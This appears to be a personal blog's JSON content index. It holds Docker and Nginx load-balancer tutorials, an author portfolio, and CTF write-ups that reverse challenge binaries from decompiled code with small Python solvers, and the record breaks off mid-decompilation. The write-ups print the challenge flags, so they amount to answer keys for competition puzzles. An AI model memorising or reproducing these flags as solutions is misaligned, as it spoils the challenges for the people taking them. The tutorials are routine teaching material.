[{"content":"Introduction Flask is a small and lightweight Python web framework that provides useful tools and features for creating web applications. It\u0026rsquo;s known for its simplicity and flexibility, making it a popular choice among developers.\nCreating a web application with Flask can be quick and straightforward. We can build a web application using only a single Python file. This makes Flask a more accessible framework for new developers.\nFlask doesn\u0026rsquo;t force a particular directory structure or require complicated boilerplate code before getting started. This means we have the freedom to structure project in a way that best suits needs.\nOne of the key features of Flask is its extensibility. We can add more functionality to Flask application using extensions. This allows to customize application to fit specific requirements.\nFlask uses the Jinja template engine to dynamically build HTML pages using familiar Python concepts such as variables, loops, lists, and so on. This means it can create dynamic web pages without having to write a lot of JavaScript.\nBefore start building a Flask application, we\u0026rsquo;ll need a local Python 3 programming environment. We\u0026rsquo;ll also need an understanding of Python 3 concepts, such as data types, conditional statements, for loops, functions, and other such concepts.\nOnce we\u0026rsquo;ve set up environment, we can install Flask using the pip package installer. After that, we\u0026rsquo;re ready to start building Flask application.\nTopology HTTP Requests: Client requests coming into the Nginx server. nginx:7151: The Nginx web server listening on port 7151. app1, app2, app3: These sections are represent the Apps that Nginx can forward requests to (it will automatically give each app a unique port, after building the container). The topology of the project consists of client requests coming into the Nginx server, which is listening on port 7151. The Nginx server can forward these requests to multiple Flask applications (app1, app2, app3), each running in its own Docker container. This setup allows for load balancing and efficient distribution of client requests, ensuring that the system can handle a large number of simultaneous connections.\nConfigurations Project Structure tree\rflask-docker-nginx-lb ├── app │ ├── Dockerfile │ ├── requirements.txt │ ├── templates │ │ └── index.html │ └── wsgi.py ├── docker-compose.yml ├── nginx.conf 2 directories, 6 files\rRequirements requirements.txt\rflask gunicorn\rDOCKER Dockerfile\rFROM python:3.9-slim WORKDIR /app COPY . . RUN pip install -r requirements.txt CMD gunicorn --bind 0.0.0.0:5000 wsgi:app\rThe Dockerfile contains app will create python environment, /app as a working directory, The application\u0026rsquo;s dependencies are listed in a requirements.txt file and include Flask and Gunicorn. Gunicorn will binding on port 5000.\ndocker-compose.yml\rversion: \u0026#34;3\u0026#34; services: app: build: context: app ports: - \u0026#34;5000\u0026#34; nginx: image: nginx:latest volumes: - ./nginx.conf:/etc/nginx/nginx.conf:ro depends_on: - app ports: - \u0026#34;7151:80\u0026#34;\rThe docker-compose.yml file is used to define and run the multi-container Docker app. It specifies the services to run configuration, and the relationships between them. Docker Compose is a tool for defining and managing multi-container Docker apps.\nNGINX nginx.conf\revents { worker_connections 1000; } http { server { listen 80; location / { proxy_pass http://app:5000; } } }\rThis nginx configuration file sets up Nginx to listen on port 80 and forward incoming requests to the Flask application running on port 5000. Nginx is a high-performance HTTP server and reverse proxy. It\u0026rsquo;s known for its high performance, stability, rich feature set, simple configuration, and low resource consumption.\nWSGI wsgi.py\rfrom flask import Flask, render_template import socket app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def home(): container_id = socket.gethostname() return render_template(\u0026#34;index.html\u0026#34;, container_id=container_id) if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=True)\rIn the wsgi.py contain a Flask application instance is created and a route is defined for the application’s home page. The home page displays a greeting and the ID of the container the application is running in. This is done using the socket.gethostname() function, which returns the host name of the current system under which the Python interpreter is executed.\nTemplates index.html\r\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Flask App\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, this is an application\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Container ID: {{ container_id }}\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rThe template index.html file is a Jinja template that is rendered by the Flask application. Jinja is a modern and designer-friendly templating language for Python, modelled after Django’s templates. It is fast, widely used and secure with the optional sandboxed template execution environment.\nBuild \u0026amp; Run container up \u0026amp; running container\r$ docker compose up -d --build --scale app=3 WARN[0000] /home/nopedawn/CobaProject/flask-docker-nginx-lb/docker-compose.yml: `version` is obsolete [+] Building 2.0s (9/9) FINISHED docker:default =\u0026gt; [app internal] load build definition from Dockerfile 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 171B 0.0s =\u0026gt; [app internal] load metadata for docker.io/library/python:3.9-slim 2.0s =\u0026gt; [app internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [app internal] load build context 0.0s =\u0026gt; =\u0026gt; transferring context: 163B 0.0s =\u0026gt; [app 1/4] FROM docker.io/library/python:3.9-slim@sha256:fd8693fc6115345452a19654c1388bc9a1029cda7b9 0.0s =\u0026gt; CACHED [app 2/4] WORKDIR /app 0.0s =\u0026gt; CACHED [app 3/4] COPY . . 0.0s =\u0026gt; CACHED [app 4/4] RUN pip install -r requirements.txt 0.0s =\u0026gt; [app] exporting to image 0.0s =\u0026gt; =\u0026gt; exporting layers 0.0s =\u0026gt; =\u0026gt; writing image sha256:1ce0f68c7e2794b4afa41a2cb3d2708328e3ee636f6148bda2224eaa4d0d51ca 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/flask-docker-nginx-lb-app 0.0s [+] Running 4/5 ⠸ Network flask-docker-nginx-lb_default Created 1.3s ✔ Container flask-docker-nginx-lb-app-3 Started 0.9s ✔ Container flask-docker-nginx-lb-app-1 Started 0.6s ✔ Container flask-docker-nginx-lb-app-2 Started 0.4s ✔ Container flask-docker-nginx-lb-nginx-1 Started 1.1s\rThis command is used to build, (re)create, start, and attach to containers for a service. -d: This option is used to run the containers in the background (detached mode). --build: This option is used to build images before starting containers. --scale app=3: This option is used to start multiple containers for a service. In this case, it starts 3 instances of the app service. This is useful when we want to scale up application to handle more traffic. The output shows the process of building the Docker image for the Flask application, starting the containers for the application and the Nginx server, and creating the network for the Docker Compose project. View container running view container recently running\r$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 5823d05b8496 nginx:latest \u0026#34;/docker-entrypoint.…\u0026#34; 5 seconds ago Up 3 seconds 0.0.0.0:7151-\u0026gt;80/tcp, :::7151-\u0026gt;80/tcp flask-docker-nginx-lb-nginx-1 bd5e7e4c228b flask-docker-nginx-lb-app \u0026#34;/bin/sh -c \u0026#39;gunicor…\u0026#34; 5 seconds ago Up 4 seconds 0.0.0.0:32777-\u0026gt;5000/tcp, :::32777-\u0026gt;5000/tcp flask-docker-nginx-lb-app-3 20a370f16776 flask-docker-nginx-lb-app \u0026#34;/bin/sh -c \u0026#39;gunicor…\u0026#34; 5 seconds ago Up 4 seconds 0.0.0.0:32778-\u0026gt;5000/tcp, :::32778-\u0026gt;5000/tcp flask-docker-nginx-lb-app-1 63eb71ad136b flask-docker-nginx-lb-app \u0026#34;/bin/sh -c \u0026#39;gunicor…\u0026#34; 5 seconds ago Up 4 seconds 0.0.0.0:32779-\u0026gt;5000/tcp, :::32779-\u0026gt;5000/tcp flask-docker-nginx-lb-app-2\rThe docker ps command output shows that the Docker Compose project is successfully running four containers. We can see one of these is an Nginx server, which is listening on port 7151 and is ready to receive incoming HTTP requests. The other three are instances of a Flask application, each running in its own container and listening on a unique port. This setup demonstrates a scalable web application architecture, where an Nginx server acts as a reverse proxy, distributing incoming requests to multiple application instances to balance the load and increase the system\u0026rsquo;s capacity to handle traffic.\nWeb View We can see in the web display running in the browser on the combined port nginx:7151, look at the container ID section if every time we refresh the value on the container ID will change this indicates that the combined port nginx:7151 has successfully forwarded from the three ports app, this load balancer will be very useful in minimizing a lot of traffic to prevent the server from going down.\nStopping the container stopping container\r$ docker compose down WARN[0000] /home/nopedawn/CobaProject/flask-docker-nginx-lb/docker-compose.yml: `version` is obsolete [+] Running 5/5 ✔ Container flask-docker-nginx-lb-nginx-1 Removed 0.6s ✔ Container flask-docker-nginx-lb-app-3 Removed 10.8s ✔ Container flask-docker-nginx-lb-app-1 Removed 11.0s ✔ Container flask-docker-nginx-lb-app-2 Removed 10.6s ✔ Network flask-docker-nginx-lb_default Removed 0.6s\rThis command is used to stop and remove containers, networks, images, and volumes. It\u0026rsquo;s a clean way to ensure that all resources created by docker compose up are removed. The output shows the process of stopping and removing the containers for the Flask application and the Nginx server, and removing the network for the Docker Compose project. ","date":"2024-04-18","id":0,"permalink":"/blog/flask-docker-nginx-creating-simple-flask-app-with-http-load-balancer/","summary":"Introduction Flask is a small and lightweight Python web framework that provides useful tools and features for creating web applications. It\u0026rsquo;s known for its simplicity and flexibility, making it a popular choice among developers.","tags":[],"title":"FLASK DOCKER NGINX: Creating Simple Flask App with HTTP Load Balancer"},{"content":"Introduction Docker \u0026amp; Nginx are both powerful tools used in modern software development and deployment workflows.\nDocker is a platform that allows to package, distribute, and run applications in lightweight, portable containers. These containers encapsulate all the dependencies required to run an application, including the code, runtime, system tools, libraries, and settings. Docker containers are isolated from each other and from the host system, ensuring consistent behavior across different environments. Docker simplifies the process of deploying applications, as developers can create containers locally and then deploy them to any environment that supports Docker, whether it\u0026rsquo;s a developer\u0026rsquo;s laptop, a testing server, or a production environment.\nNginx is a high-performance, open-source web server and reverse proxy server. It\u0026rsquo;s known for its efficiency in handling concurrent connections and serving static content quickly. Nginx is often used as a front-end proxy server to route HTTP requests to backend applications or to serve static files directly to clients. It\u0026rsquo;s highly configurable and can be used for various purposes, including load balancing, caching, SSL termination, and serving as a reverse proxy for microservices.\nWhen used together, Docker and Nginx can be a powerful combination for deploying web applications. Here\u0026rsquo;s how they might be used together:\nContainerization: Developers package their web applications and services into Docker containers. These containers include the application code, runtime, dependencies, and any necessary configuration.\nDocker Compose: Docker Compose is a tool for defining and running multi-container Docker applications. Developers can use Docker Compose to define the services that make up their application stack, including the web server (Nginx) and any backend services. Docker Compose simplifies the process of managing and orchestrating multiple Docker containers.\nNginx as a Reverse Proxy: In many deployment scenarios, Nginx is used as a reverse proxy server to route incoming HTTP requests to the appropriate backend services running in Docker containers. Nginx can also handle tasks like load balancing, SSL termination, and caching.\nScaling and Load Balancing: Docker Swarm or Kubernetes can be used to orchestrate multiple Docker containers across a cluster of servers. Nginx can be configured as a load balancer to distribute incoming traffic across the various instances of the application, ensuring high availability and scalability.\nStatic Content Serving: Nginx excels at serving static content efficiently. In a Dockerized environment, Nginx can be used to serve static files directly to clients, offloading this task from the application servers and improving performance.\nDocker and Nginx complement each other well, providing developers with powerful tools for building, deploying, and managing modern web applications.\nTopology HTTP Requests: Represents client requests coming into the Nginx server. Nginx:9999: Represents the Nginx web server listening on port 9999. App1, App2, App3: These sections represent the backend servers that Nginx can forward requests to. Configurations NGINX nginx.conf\rhttp { upstream backends { server server-1 weight=2; server server-2; server server-3 backup; } server { listen 9999; location / { proxy_pass http://backends/; } } } events {}\rThis configuration for the Nginx server, which acts as a load balancer. Inside the http block, there\u0026rsquo;s an upstream block named backends, which defines a group of backend servers (server-1, server-2, server-3).\nserver-1 is assigned a weight of 2, indicating that it should receive twice as much traffic as the other servers. server-3 is designated as a backup server, meaning it only handles requests if the primary servers (server-1 and server-2) are unavailable. Inside the server block, there\u0026rsquo;s a location block specifying that all requests should be proxied to the backends group defined earlier.\nDOCKER docker-compose.yml\rversion: \u0026#39;3\u0026#39; services: server-1: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false server-2: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false server-3: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false nginx: image: nginx volumes: - \u0026#34;./nginx.conf:/etc/nginx/nginx.conf\u0026#34; ports: - 9999:9999\rThis docker compose file defines the Docker services for setup. It specifies four services:\nThree services (server-1, server-2, server-3) based on the ealen/echo-server Docker image. These services represent the backend servers that will receive traffic from the Nginx load balancer. One service (nginx) based on the official Nginx Docker image. It mounts the nginx.conf file into the container and exposes port 9999, where the Nginx server listens for incoming HTTP requests. Build \u0026amp; Run container up \u0026amp; running container\r$ docker compose up -d WARN[0000] /home/nopedawn/CobaProject/test-load-balancer/docker-compose.yml: `version` is obsolete [+] Running 4/5 ⠹ Network test-load-balancer_default Created 1.3s ✔ Container test-load-balancer-server-2-1 Started 1.1s ✔ Container test-load-balancer-server-1-1 Started 0.9s ✔ Container test-load-balancer-nginx-1 Started 0.6s ✔ Container test-load-balancer-server-3-1 Started 0.5s\rTo run it, we can use this command to builds and starts the Docker services defined in the docker-compose.yml file in detached mode, meaning it run in the background.\nMonitoring monitoring\r$ watch -n 1 curl -s localhost:9999 Every 1.0s: curl -s localhost:9999 npdn: Mon Apr 8 13:43:39 2024 {\u0026#34;host\u0026#34;:{\u0026#34;hostname\u0026#34;:\u0026#34;backends\u0026#34;,\u0026#34;ip\u0026#34;:\u0026#34;::ffff:172.21.0.3\u0026#34;,\u0026#34;ips\u0026#34;:[]},\u0026#34;http\u0026#34;:{\u0026#34;method\u0026#34;:\u0026#34;GET\u0026#34;,\u0026#34;baseUrl\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;originalUrl\u0026#34;:\u0026#34;/\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;http\u0026#34;},\u0026#34;request\u0026#34;:{\u0026#34;params\u0026#34;:{\u0026#34;0\u0026#34;:\u0026#34;/\u0026#34;},\u0026#34;query\u0026#34;:{},\u0026#34;cookies\u0026#34;:{},\u0026#34;body\u0026#34;:{},\u0026#34;headers\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;backends\u0026#34;,\u0026#34;connection\u0026#34;:\u0026#34;close\u0026#34;,\u0026#34;user-agent\u0026#34;:\u0026#34;curl/7.81.0\u0026#34;,\u0026#34;accept\u0026#34;:\u0026#34;*/*\u0026#34;}}}\rThis command continuously monitors the output of the curl -s localhost:9999 command, which fetches the response from the Nginx load balancer. It allows to observe how requests are distributed among the backend servers.\nLog View $ docker compose logs -f server-1\r$ docker compose logs -f server-2\r$ docker compose logs -f server-3\rThese commands used to view the logs of each individual container (server-1, server-2, server-3) managed by Docker Compose.\nStopping the container stopping container\r$ docker compose down WARN[0000] /home/nopedawn/CobaProject/test-load-balancer/docker-compose.yml: `version` is obsolete [+] Running 5/5 ✔ Container test-load-balancer-server-2-1 Removed 1.1s ✔ Container test-load-balancer-server-3-1 Removed 1.4s ✔ Container test-load-balancer-nginx-1 Removed 1.6s ✔ Container test-load-balancer-server-1-1 Removed 1.2s ✔ Network test-load-balancer_default Removed 0.6s\rTo stop it and removes all containers created by Docker Compose. It ensures a clean slate before starting the services again.\n","date":"2024-04-08","id":1,"permalink":"/blog/docker-nginx-echo-server-http-load-balancer/","summary":"Introduction Docker \u0026amp; Nginx are both powerful tools used in modern software development and deployment workflows.\nDocker is a platform that allows to package, distribute, and run applications in lightweight, portable containers.","tags":[],"title":"DOCKER \u0026 NGINX: Echo Server HTTP Load Balancer"},{"content":"","date":"2023-09-07","id":2,"permalink":"/blog/","summary":"","tags":[],"title":"Featured Works"},{"content":"","date":"2023-09-07","id":3,"permalink":"/posts/guides/","summary":"","tags":[],"title":"About"},{"content":"","date":"2023-09-07","id":4,"permalink":"/posts/guides/.../","summary":"","tags":[],"title":"..."},{"content":"Ramadhan An Informatics Student with 2+ years of experience in the IT industry. Proven ability to collaborate effectively within a team environment, and deliver numerous projects in Cloud-Computing, Back-End, Network Engineer, and CTF Problem Setter. Actively engaged in the cybersecurity community and seeking to further apply and expand skills in a professional setting.\rExperience \u0026mdash;\u0026ndash; Date Position Company Jan 2022 - Present Core Team Member Cyber Community Universitas Gunadarma Feb 2024 - Aug 2024 Cloud Computing Cohort Bangkit Academy led by Google, Tokopedia, Gojek, \u0026amp; Traveloka Aug 2019 - Sep 2021 Computer Lab Assistant (Network Engineer and Management System) SMK Muhammadiyah 7 Jakarta Mar 2020 - May 2020 IT Support Technician Associated with PSIK (Pengembangan Sistem Informasi Kepegawaian) Badan Kepegawaian Negara Projects CTF COMPETITION NATIONAL - TECHNOFAIR 11.0\rBangkit 2024 Capstone Project | Cloud Computing \u0026amp; Backend Side\rApplied Machine Learning for Cloud Engineer | Dicoding Project\rCTF COMPETITION NATIONAL - TECHNOFAIR 10.0\rFeatured Works FLASK DOCKER NGINX: Creating Simple Flask App with HTTP Load Balancer\rDOCKER \u0026amp; NGINX: Echo Server HTTP Load Balancer\rCRUD Data Pegawai Sederhana (React-JS, MYSQL)\rMVC Web Constant Blog CodeIgniter4 with JSON API\rSimple Base64 Encoder/Decoder WebTools\rLPK Mendal | Company Profile Website\rEducation Name Field of study Date Universitas Gunadarma S1 - Bachelor\u0026rsquo;s degree, Informatics Engineering 2021 - Present SMK Muhammadiyah 7 Jakarta Student, Computer Network Engineering 2018 - 2021 Licenses \u0026amp; Certifications Name Issued by Security Engineer TryHackMe Google Cloud Skill Boost Google Cloud Skill Boost \u0026hellip;Cyber Threat ManagementIntroduction to CybersecurityNetworking Basics Cisco Networking Academy \u0026hellip;Belajar Membuat Aplikasi Back-End untuk Pemula dengan Google CloudBelajar Penerapan Machine Learning dengan Google CloudMenjadi Google Cloud EngineerBelajar Dasar Pemrograman Web Dicoding Indonesia \u0026hellip;Belajar Membuat Aplikasi Back-End untuk PemulaBelajar Dasar Pemrograman JavaScriptBelajar Jaringan Komputer untuk PemulaBelajar Dasar-Dasar DevOpsCloud Practitioner Essentials (Belajar Dasar AWS Cloud) Dicoding Indonesia \u0026hellip;The Bits and Bytes of Computer NetworkingSystem Administration and IT Infrastructure Services Coursera \u0026hellip;NodeJS Development Path BootcampNodeJS Development Path Bootcamp x Kotakode Progate x Kotakode Certificate Competence of Computer and Network Engineering Badan Nasional Sertifikasi Profesi (BNSP) Volunteering Organization Role Description Date Cyber Community Universitas Gunadarma Core Team Member \u0026hellip;Actively engaged in the cybersecurity community as CTF Player, etc. Jan 2022 - Present TechnoFair TechnoFair 11.0 CTF Problem Setter \u0026hellip;TechnoFair is the biggest IT event held by the Student Executive Board of the Faculty of Computer Science and Information Technology, Gunadarma University. Created Digital Forensics challenges for the final round Jul 2024 - Jul 2024 Cyber Community Universitas Gunadarma Hackfest 0x07 CTF Problem Setter \u0026hellip;Hackfest is an annual CTF Competition, which held by CCUG for looking to a new talent in Cyber Security / CTF. Created Reverse Engineering challenges for the preliminary round, and Digital Forensics w/ Reverse Engineering for the final round. Nov 2023 - Dec 2023 TechnoFair TechnoFair 10.0 CTF Problem Setter \u0026hellip;TechnoFair is the biggest IT event held by the Student Executive Board of the Faculty of Computer Science and Information Technology, Gunadarma University. Created Digital Forensics challenges for the preliminary round and the final round. Jul 2023 - Jul 2023 Cyber Community Universitas Gunadarma Hackfest 0x06 CTF Problem Setter \u0026hellip;Hackfest is an annual CTF Competition, which held by CCUG for looking to a new talent in Cyber Security / CTF. Created Digital Forensics challenges for the preliminary round, and final round. Dec 2022 - Jan 2023 Honor \u0026amp; Awards Event Description Issued by Date National Finalist GEMASTIK XVII Divisi 2 Keamanan Siber 2024 Pagelaran Mahasiswa Nasional Bidang Teknologi Informasi dan Komunikasi Kementerian Pendidikan, Kebudayaan, Riset, dan Teknologi, Sekretariat Jenderal, Pusat Prestasi Nasional, Balai Pengembangan Talenta Indonesia Sep 2024 International 10th Place in NiteCTF International 2023 Play with CCUG (Cyber Community Universitas Gunadarma) Cryptonite, Manipal Academy of Higher Education Dec 2023 Internal 3rd Place in Hackfest0x05 CTF 2021 Annual CCUG competition is held to recruit new CCUG members. Cyber Community Universitas Gunadarma Jan 2022 Organizations Name Position Held Date Cyber Community Universitas Gunadarma Core Team Member Jan 2022 - Present ","date":"2023-09-07","id":5,"permalink":"/portfolio/","summary":"Ramadhan An Informatics Student with 2+ years of experience in the IT industry. Proven ability to collaborate effectively within a team environment, and deliver numerous projects in Cloud-Computing, Back-End, Network Engineer, and CTF Problem Setter.","tags":[],"title":"Portfolio"},{"content":"","date":"2024-01-01","id":6,"permalink":"/posts/ctfs/2024/","summary":"","tags":[],"title":"2024"},{"content":"","date":"2023-09-07","id":7,"permalink":"/posts/ctfs/","summary":"","tags":[],"title":"CTF"},{"content":"","date":"2023-01-01","id":8,"permalink":"/posts/ctfs/2023/","summary":"","tags":[],"title":"2023"},{"content":"","date":"2022-01-01","id":9,"permalink":"/posts/ctfs/2022/","summary":"","tags":[],"title":"2022"},{"content":"Solved for 5 challenges including: (1 Crypto, 2 Forensics, 1 Reverse Engineering, 1 Web Exploitation)\nhttps://gemastik.kemdikbud.go.id/\nRepo File Official Github Repository GEMASTIK 17 XVII QUAL CTF 2024\nWriteup Docs Writeup GEMASTIK 17 XVII QUAL CTF 2024\n","date":"2024-08-20","id":10,"permalink":"/posts/ctfs/2024/gemastik-17-xvii-qual-ctf-2024/","summary":"Solved for 5 challenges including: (1 Crypto, 2 Forensics, 1 Reverse Engineering, 1 Web Exploitation)\nhttps://gemastik.kemdikbud.go.id/\nRepo File Official Github Repository GEMASTIK 17 XVII QUAL CTF 2024","tags":[],"title":"GEMASTIK 17 XVII QUAL CTF 2024"},{"content":"https://ctftime.org/event/2358\nCHALL\u0026rsquo;S SOLVED Category Challenge Misc Morse Me OSINT Where Am I 1/3 Reverse Just Read Reverse Reverse Me Web Web Cook Misc Morse Me Overview\rAuthor: algorab Description: biiip biiip biiip biiip biiip bip biiip bip bip bip bip bip challenge.txt First misc challenge, given the plaintext containing morse-code\nchallenge.txt\r$ cat challenge.txtrWe can immediately decode it using https://morsedecoder.com/\nMorse decoded value:\n436F6E677261747A212054686520666C61672069733A204E3050537B4D307253335F443363306433525F5072307D\rNow, decode from Hex\n$ python3 \u0026gt;\u0026gt;\u0026gt; val = \u0026#39;436F6E677261747A212054686520666C61672069733A204E3050537B4D307253335F443363306433525F5072307D\u0026#39; \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(val).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;Congratz! The flag is: N0PS{M0rS3_D3c0d3R_Pr0}\u0026#39;\rFLAG\rN0PS{M0rS3_D3c0d3R_Pr0}\nOSINT Where Am I 1/3 Overview\rAuthor: algorab Description: u will never find where i am lollz Note: The flag is the name of the place in ASCII lowercase (no special character, no commas), words separated by dash (-). For instance, if the place is Musée du Louvre, the flag will be N0PS{musee-du-louvre}.\nimg.jpg It\u0026rsquo;s been a long time since I\u0026rsquo;ve done an OSINT challenge, but this time I just solved an easy one, hehe.\nThere are some details that match the photo in Google Lens\nI found the place on Shutterstock about the Photo Description,\nPhoto Description Stock Photo ID: 1063647680 Lisbon. Portugal. January 28, 2018. Aerial view of Commerce Square (Praca do Comercio)\rAnd the final place is (Praca do Comercio)\nFLAG\rN0PS{praca-do-comercio}\nReverse Just Read Overview\rAuthor: algorab Description: Find a way to break this. main Decompiled of the main function\ndecompiled main\rint __cdecl main(int argc, const char **argv, const char **envp) { bool v3; // bl char *s; // [rsp+18h] [rbp-18h] s = (char *)argv[1]; v3 = s[22] == 125 \u0026amp;\u0026amp; s[21] == 116 \u0026amp;\u0026amp; s[20] == 78 \u0026amp;\u0026amp; s[19] == 49 \u0026amp;\u0026amp; s[18] == 95 \u0026amp;\u0026amp; s[17] == 115 \u0026amp;\u0026amp; s[16] == 116 \u0026amp;\u0026amp; s[15] == 105 \u0026amp;\u0026amp; s[14] == 98 \u0026amp;\u0026amp; s[13] == 56 \u0026amp;\u0026amp; s[12] == 95 \u0026amp;\u0026amp; s[11] == 115 \u0026amp;\u0026amp; s[10] == 49 \u0026amp;\u0026amp; s[9] == 95 \u0026amp;\u0026amp; s[8] == 114 \u0026amp;\u0026amp; s[7] == 52 \u0026amp;\u0026amp; s[6] == 72 \u0026amp;\u0026amp; s[5] == 99 \u0026amp;\u0026amp; s[4] == 123 \u0026amp;\u0026amp; s[3] == 83 \u0026amp;\u0026amp; s[2] == 80 \u0026amp;\u0026amp; *s == 78 \u0026amp;\u0026amp; s[1] == 48; if ( (v3 \u0026amp; (strlen(s) == 23)) != 0 ) puts(\u0026#34;Well done, you can validate with this flag!\u0026#34;); else puts(\u0026#34;Wrong flag!\u0026#34;); return 0; }\rThe flag is checked character by character, and the ASCII values of the characters are directly compared in the code. And the he ASCII values are compared in reverse order. If we convert these ASCII values to characters and reverse the order, we can get the flag.\nHere\u0026rsquo;s the solver\nsolver.py\r1ascii_values = [78, 48, 80, 83, 123, 99, 72, 52, 114, 95, 49, 115, 95, 56, 98, 105, 116, 115, 95, 49, 78, 116, 125] 2 3characters = [chr(value) for value in ascii_values] 4flag = \u0026#39;\u0026#39;.join(characters[::-1]) 5 6print(flag[::-1])\r$ python3 solver.py N0PS{cH4r_1s_8bits_1Nt}\rFLAG\rN0PS{cH4r_1s_8bits_1Nt}\nReverse Me Overview\rAuthor: Simone Aonzo Description: Don\u0026rsquo;t complain if you can\u0026rsquo;t see me, because I have to be reversed to make me run 🙃 img.jpg Bro! why it must in .jpg extension 🗿\nFirstly, if we look at the last part of the hexdump value there is something like FLE but if we reverse it it becomes ELF, got em!\nxxd img.jpg | tail\r$ xxd img.jpg | tail 000037f0: 0000 0000 0000 001c 0000 0000 0000 0318 ................ 00003800: 0000 0000 0000 0318 0000 0000 0000 0318 ................ 00003810: 0000 0004 0000 0003 0000 0000 0000 0008 ................ 00003820: 0000 0000 0000 02d8 0000 0000 0000 02d8 ................ 00003830: 0000 0000 0000 0040 0000 0000 0000 0040 .......@.......@ 00003840: 0000 0000 0000 0040 0000 0004 0000 0006 .......@........ 00003850: 001c 001d 0040 000d 0038 0040 0000 0000 .....@...8.@.... 00003860: 0000 0000 0000 3148 0000 0000 0000 0040 ......1H.......@ 00003870: 0000 0000 0000 1310 0000 0001 003e 0003 .............\u0026gt;.. 00003880: 0000 0000 0000 0000 0001 0102 464c 457f ............FLE.\rSo, here\u0026rsquo;s the value after we reverse all the bytes, and don\u0026rsquo;t forget to remove .jpg extension.\nreverse.py\r1input_file_path = \u0026#39;img.jpg\u0026#39; 2output_file_path = \u0026#39;img\u0026#39; 3 4with open(input_file_path, \u0026#39;rb\u0026#39;) as file: 5 reversed_content = file.read()[::-1] 6 7with open(output_file_path, \u0026#39;wb\u0026#39;) as reversed_file: 8 reversed_file.write(reversed_content) 9 10print(f\u0026#39;Done.\\nFile: {output_file_path}\u0026#39;)\rxxd img | head\r$ xxd img | head 00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000 .ELF............ 00000010: 0300 3e00 0100 0000 1013 0000 0000 0000 ..\u0026gt;............. 00000020: 4000 0000 0000 0000 4831 0000 0000 0000 @.......H1...... 00000030: 0000 0000 4000 3800 0d00 4000 1d00 1c00 ....@.8...@..... 00000040: 0600 0000 0400 0000 4000 0000 0000 0000 ........@....... 00000050: 4000 0000 0000 0000 4000 0000 0000 0000 @.......@....... 00000060: d802 0000 0000 0000 d802 0000 0000 0000 ................ 00000070: 0800 0000 0000 0000 0300 0000 0400 0000 ................ 00000080: 1803 0000 0000 0000 1803 0000 0000 0000 ................ 00000090: 1803 0000 0000 0000 1c00 0000 0000 0000 ................\rNow, lets try to decompiled it\ndecompiled main\rvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int v3; // ebp int v4; // er12 int v5; // er13 int v6; // ebx __int64 v7; // rax __int64 v8; // rax __int64 v9; // r9 __int64 v10; // r8 char *v11; // rbp __int64 v12; // [rsp-8h] [rbp-C0h] char src[32]; // [rsp+20h] [rbp-98h] BYREF char v14[56]; // [rsp+40h] [rbp-78h] BYREF unsigned __int64 v15; // [rsp+78h] [rbp-40h] v15 = __readfsqword(0x28u); if ( a1 == 5 ) { v3 = strtol(a2[1], 0LL, 10); v4 = strtol(a2[2], 0LL, 10); v5 = strtol(a2[3], 0LL, 10); v6 = strtol(a2[4], 0LL, 10); if ( (unsigned __int8)sub_1460((unsigned int)v3, (unsigned int)v4, (unsigned int)v5, (unsigned int)v6) ) { v7 = (unsigned int)-v6; if ( v6 \u0026gt; 0 ) v7 = (unsigned int)v6; v12 = v7; v8 = (unsigned int)-v5; if ( v5 \u0026gt; 0 ) v8 = (unsigned int)v5; v9 = (unsigned int)-v4; if ( v4 \u0026gt; 0 ) v9 = (unsigned int)v4; v10 = (unsigned int)-v3; if ( v3 \u0026gt; 0 ) v10 = (unsigned int)v3; __sprintf_chk(v14, 1LL, 42LL, \u0026#34;%d%d%d%d\u0026#34;, v10, v9, v8, v12); qmemcpy(src, \u0026amp;unk_2016, 0x19uLL); v11 = (char *)sub_1A50(src, 0x18uLL); puts(v11); free(v11); exit(0); } } exit(-1); }\rThe main function checks if it has exactly 5 arguments (including the program name itself). If not, it exits with a status of -1. If there are 5 arguments, it converts the next 4 arguments to integers using strtol and checks if they satisfy a certain condition using the sub_1460 function.\ndecompiled sub_1460\r__int64 __fastcall sub_1460(int a1, int a2, int a3, int a4) { unsigned int v4; // er8 v4 = 0; if ( 3 * a4 + a3 + 4 * a2 - 10 * a1 != 28 ) return 0LL; if ( 9 * a2 - 8 * a1 + 6 * a3 - 2 * a4 == 72 \u0026amp;\u0026amp; a4 + -3 * a2 - 2 * a1 - 8 * a3 == 29 ) LOBYTE(v4) = a3 + 5 * a1 + 7 * a2 - 6 * a4 == 88; return v4; }\rThe sub_1460 function checks if the four input integers satisfy four specific equations. If they do, it returns 1 (true), otherwise it returns 0 (false).\ndecompiled sub_1A50\rvoid *__fastcall sub_1A50(void *src, size_t n, __m128i *a3, __int64 a4) { __m128i v5; // rax size_t v6; // rbx unsigned int *v7; // rax unsigned int *v8; // r12 __m128i *v9; // rbp unsigned int v10; // er13 unsigned int v11; // ecx unsigned int v12; // er10 unsigned int *v13; // rsi int v14; // edi unsigned int v15; // er8 unsigned int v16; // er9 __int64 v17; // rax size_t v18; // rbx void *v19; // r13 size_t *v20; // rax 